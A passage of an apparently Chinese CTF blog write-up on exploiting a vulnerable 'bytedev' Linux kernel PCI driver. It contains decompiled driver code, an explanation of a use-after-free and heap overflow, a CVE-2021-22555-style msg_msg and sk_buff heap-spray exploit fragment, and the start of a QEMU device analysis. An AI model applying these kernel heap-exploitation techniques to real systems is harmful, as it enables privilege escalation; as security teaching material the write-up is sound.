*v19; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v20; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v21; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v22; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v24; <span class="comment">// eax</span></span><br><span class="line">  __int64 v25; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *v27; <span class="comment">// rax</span></span><br><span class="line">  _WORD *v28; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))_fentry__)();</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v32 = v4 + <span class="number">0x28</span>;</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">0x28</span>);</span><br><span class="line">  v5 = __indword(*(_QWORD *)(v4 + <span class="number">0x20</span>));</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">0x200</span>LL;</span><br><span class="line">      v21 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x200</span> )</span><br><span class="line">        v20 = a3;</span><br><span class="line">      v22 = *(_QWORD *)(v21 + <span class="number">0x20</span>);</span><br><span class="line">      v10 = v20;</span><br><span class="line">      v23 = __indword(v22);</span><br><span class="line">      <span class="keyword">if</span> ( v23 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v24 = __indword(v22 + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v24 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = *(_QWORD *)(v21 + <span class="number">0x18</span>);</span><br><span class="line">          _check_object_size(v25, v20, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( copy_from_user(v25, a2, v10) )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = <span class="number">-14LL</span>;</span><br><span class="line">            printk(&amp;unk_1090);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = <span class="number">-14LL</span>;</span><br><span class="line">          printk(&amp;unk_FF0);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">-14LL</span>;</span><br><span class="line">        printk(&amp;unk_FC0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-14LL</span>;</span><br><span class="line">      printk(&amp;unk_1038);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    idx = *(_DWORD *)(v6 + <span class="number">0xB4</span>);</span><br><span class="line">    read_idx = *(_DWORD *)(v6 + <span class="number">0xB0</span>);</span><br><span class="line">    v9 = idx + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (idx + <span class="number">1</span>) % <span class="number">16</span> != read_idx</span><br><span class="line">      || (v28 = *(_WORD **)(v6 + <span class="number">8LL</span> * idx + <span class="number">0x30</span>)) == <span class="number">0LL</span></span><br><span class="line">      || (v10 = <span class="number">-14LL</span>, *v28 &lt;= <span class="number">0xFFB</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v9 % <span class="number">16</span> == read_idx )</span><br><span class="line">          &#123;</span><br><span class="line">            v27 = *(_WORD **)(v6 + <span class="number">8LL</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( *v27 &gt; <span class="number">0xFFB</span>u )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          chunk = *(_WORD **)(v6 + <span class="number">8LL</span> * ((idx + <span class="number">0xF</span>) % <span class="number">16</span>) + <span class="number">0x30</span>);</span><br><span class="line">          user_buf = a2 + v10;</span><br><span class="line">          <span class="keyword">if</span> ( chunk &amp;&amp; (write_offset = (<span class="keyword">unsigned</span> __int16)*chunk, (_WORD)write_offset != <span class="number">0xFFC</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = (<span class="keyword">unsigned</span> __int16)write_offset;</span><br><span class="line">            v12 = (__int64)chunk + write_offset + <span class="number">4</span>;</span><br><span class="line">            remaining_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">0xFFC</span> - v11);</span><br><span class="line">            <span class="keyword">if</span> ( remaining_size &gt; a3 )</span><br><span class="line">              remaining_size = a3;</span><br><span class="line">            <span class="keyword">if</span> ( (remaining_size &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> )</span><br><span class="line">              BUG();</span><br><span class="line">            v30 = v12;</span><br><span class="line">            _check_object_size(v12, remaining_size, <span class="number">0LL</span>);</span><br><span class="line">            v14 = copy_from_user(v30, user_buf, remaining_size);</span><br><span class="line">            <span class="keyword">if</span> ( v14 )</span><br><span class="line">            &#123;</span><br><span class="line">              v10 = v14;</span><br><span class="line">              printk(&amp;unk_1060);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *chunk += remaining_size;</span><br><span class="line">            a3 -= remaining_size;</span><br><span class="line">            v10 += remaining_size;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v31 = idx;</span><br><span class="line">            v18 = <span class="number">0xFFC</span>LL;</span><br><span class="line">            v19 = (_DWORD *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">26</span>], <span class="number">0x400CC0</span>LL, <span class="number">0x1000</span>LL);</span><br><span class="line">            *(_QWORD *)(v6 + <span class="number">8LL</span> * v31 + <span class="number">0x30</span>) = v19;</span><br><span class="line">            <span class="keyword">if</span> ( a3 &lt;= <span class="number">0xFFC</span> )</span><br><span class="line">              v18 = a3;</span><br><span class="line">            *(_DWORD *)(v6 + <span class="number">0xB4</span>) = (*(_DWORD *)(v6 + <span class="number">0xB4</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">            *v19 = <span class="number">0</span>;</span><br><span class="line">            _check_object_size(v19 + <span class="number">1</span>, v18, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( copy_from_user(v19 + <span class="number">1</span>, user_buf, v18) )</span><br><span class="line">              <span class="keyword">return</span> ((__int64 (*)(<span class="keyword">void</span>))bytedev_write_cold_15)();</span><br><span class="line">            a3 -= v18;</span><br><span class="line">            *(_WORD *)v19 += v18;</span><br><span class="line">            v10 += v18;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( !a3 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          idx = *(_DWORD *)(v6 + <span class="number">0xB4</span>);</span><br><span class="line">          read_idx = *(_DWORD *)(v6 + <span class="number">0xB0</span>);</span><br><span class="line">          v9 = idx + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  raw_spin_unlock(v32);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里write的做法跟read类似，依旧可以分为两个部分。通过我上面修改的变量名称其实也就可以很好的推断出来实际的结构了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ptr &#123;</span><br><span class="line"><span class="number">0xC8</span> : manager_object</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">manager_object &#123;</span><br><span class="line">(<span class="number">0x30</span> + idx * <span class="number">0x8</span>) : each_data</span><br><span class="line"><span class="number">0xB0</span> : read_idx</span><br><span class="line"><span class="number">0xB4</span> : write_idx</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">each_data &#123;</span><br><span class="line"><span class="number">0x0</span> : write_size</span><br><span class="line"><span class="number">0x2</span> : read_size</span><br><span class="line"><span class="number">0x4</span> — <span class="number">0xfff</span> : content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是类似于上述这样的结构。这里的漏洞主要发生于read中，可以看到在已经读取的size为<code>0xffc</code>时则会free掉响应的object但是，实际的指针并没有被清除，这样也就造成了UAF。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk = *(_WORD **)(v6 + <span class="number">8LL</span> * ((idx + <span class="number">0xF</span>) % <span class="number">16</span>) + <span class="number">0x30</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( chunk &amp;&amp; (write_offset = (<span class="keyword">unsigned</span> __int16)*chunk, (_WORD)write_offset != <span class="number">0xFFC</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  *(_DWORD *)(v6 + <span class="number">0xB4</span>) = (*(_DWORD *)(v6 + <span class="number">0xB4</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在write函数中虽然在第一次写入的时候会修改<code>write_idx</code>为1但是在第二次调用的时候会加上<code>0xf</code>随即和16取余，而这也就等价于对<code>write_idx</code>减一的操作，也就以为着我们仍然可以对刚创建的object进行使用。不过前提是还需要绕过这个if语句，当然绕过的方式也是十分简单，这里使用<code>sk_buff</code>进行堆喷即可并且如果<code>write_size</code>我们修改为比<code>0xffc</code>大的数字还可造成堆溢出。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里的利用方式依旧采用<a href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/">CVE-2021-22555</a>进行利用，不熟悉的朋友可以去查看我先前对这一利用方法的分析。</p><p>因为利用方法以往已经分析过了所以这里只对如何达到上述利用的条件做分析。</p><p>这里又一次不得不提到一个常用的结构体<code>msg_msg</code>了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后就是我们熟悉的关于<code>msg_msg</code>和<code>msg_queue</code>之间的结构为一个双向链表结构，并且结合linux源码可以看到寻找消息的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">find_msg</span><span class="params">(struct msg_queue *msq, <span class="keyword">long</span> *msgtyp, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">found</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;</span><br><span class="line"><span class="keyword">if</span> (testmsg(msg, *msgtyp, mode) &amp;&amp;</span><br><span class="line">    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,</span><br><span class="line">       *msgtyp, mode)) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != <span class="number">1</span>) &#123;</span><br><span class="line">*msgtyp = msg-&gt;m_type - <span class="number">1</span>;</span><br><span class="line">found = msg;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == SEARCH_NUMBER) &#123;</span><br><span class="line"><span class="keyword">if</span> (*msgtyp == count)</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> found ?: ERR_PTR(-EAGAIN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_for_each_entry(pos, head, member)\</span></span><br><span class="line"><span class="meta">for (pos = list_first_entry(head, typeof(*pos), member);\</span></span><br><span class="line"><span class="meta">     !list_entry_is_head(pos, head, member);\</span></span><br><span class="line"><span class="meta">     pos = list_next_entry(pos, member))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_first_entry(ptr, type, member) \</span></span><br><span class="line"><span class="meta">list_entry((ptr)-&gt;next, type, member)</span></span><br></pre></td></tr></table></figure><p><strong>可以发现使用next指针进行寻找的，那么根据在<code>vuln driver</code>中存在的漏洞就是堆溢出，所以理所当然的就能够想到通过堆溢出修改紧邻的<code>primary msg_msg</code>结构体的next指针指向随机一个<code>seconday msg_msg</code>即可造成两个指针指向通过一个object的情况。那么如果我们这时通过原本指向的<code>secondary msg_msg</code>的<code>primary msg_msg</code>的<code>msg_queue</code>进行索引去<code>msgrcv</code>的话即可释放掉<code>secondary msg_msg</code>，但是还存在一个被堆溢出修改的<code>primary msg_msg</code>的next指针依旧指向<code>secondary msg_msg</code>那么我们仍然可以通过被破坏的<code>primary msg_msg</code>去索引到已经被free掉的<code>secondary msg_msg</code>。这也就造成了我们所期盼的UAF了。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">             <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">             <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0x84</span>, <span class="number">0x1000</span>);</span><br><span class="line">write(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buf = <span class="number">0xffd</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0xa0</span>, <span class="number">0x1000</span>);</span><br><span class="line">write(fd, buf, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>上述代码就是产生漏洞利用条件的攻击代码片段。</p><h2 id="QEMU分析"><a href="#QEMU分析" class="headerlink" title="QEMU分析"></a>QEMU分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_driver</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pci_device_id</span> *<span class="title">id_table</span>;</span> </span><br><span class="line">        <span class="keyword">int</span>  (*probe)  (struct pci_dev *dev, <span class="keyword">const</span> struct pci_device_id *id);   <span class="comment">/* New device inserted */</span></span><br><span class="line">        <span class="keyword">void</span> (*remove) (struct pci_dev *dev);   <span class="comment">/* Device removed (NULL if not a hot-plug capable driver) */</span></span><br><span class="line">        <span class="keyword">int</span>  (*suspend) (struct pci_dev *dev, <span class="keyword">pm_message_t</span> state);      <span class="comment">/* Device suspended */</span></span><br><span class="line">        <span class="keyword">int</span>  (*suspend_late) (struct pci_dev *dev, <span class="keyword">pm_message_t</span> state);</span><br><span class="line">        <span class="keyword">int</span>  (*resume_early) (struct pci_dev *dev);</span><br><span class="line">        <span class="keyword">int</span>  (*resume) (struct pci_dev *dev);                   <span class="comment">/* Device woken up */</span></span><br><span class="line">        <span class="keyword">void</span> (*shutdown) (struct pci_dev *dev);</span><br><span class="line">        <span class="keyword">int</span> (*sriov_configure) (struct pci_dev *dev, <span class="keyword">int</span> num_vfs); <span class="comment">/* PF pdev */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pci_error_handlers</span> *<span class="title">err_handler</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">device_driver</span>    <span class="title">driver</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pci_dynids</span> <span class="title">dynids</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先使用<code>_pci_register_driver</code>函数注册一个设备驱动，上述就是对应的结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000001E00 00                            bytedev_driver db    0                  ; DATA XREF: init_module+132↑o</span><br><span class="line">.data:0000000000001E00                                                                       ; cleanup_module+2B↑o</span><br><span class="line">.data:0000000000001E01 00                            db    0</span><br><span class="line">.data:0000000000001E02 00                            db    0</span><br><span class="line">.data:0000000000001E03 00                            db    0</span><br><span class="line">.data:0000000000001E04 00                            db    0</span><br><span class="line">.data:0000000000001E05 00                            db    0</span><br><span class="line">.data:0000000000001E06 00                            db    0</span><br><span class="line">.data:0000000000001E07 00                            db    0</span><br><span class="line">.data:0000000000001E08 00                            db    0</span><br><span class="line">.data:0000000000001E09 00                            db    0</span><br><span class="line">.data:0000000000001E0A 00                            db    0</span><br><span class="line">.data:0000000000001E0B 00                            db    0</span><br><span class="line">.data:0000000000001E0C 00                            db    0</span><br><span class="line">.data:0000000000001E0D 00                            db    0</span><br><span class="line">.data:0000000000001E0E 00                            db    0</span><br><span class="line">.data:0000000000001E0F 00                            db    0</span><br><span class="line">.data:0000000000001E10 03 0C 00 00 00 00 00 00       dq offset aBytedev                      ; &quot;bytedev&quot;</span><br><span class="line">.data:0000000000001E18 00 13 00 00 00 00 00 00       dq offset bytedev_ids</span><br><span class="line">.data:0000000000001E20 95 06 00 00 00 00 00 00       dq offset bytedev_pci_probe</span><br><span class="line">.data:0000000000001E28 C0 00 00 00 00 00 00 00       dq offset bytedev_pci_remove</span><br></pre></td></tr></table></figure><p>在内存中就是这样，在注册函数中会调用<code>bytedev_pci_probe</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_pci_probe</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// r12d</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v12[<span class="number">14</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span 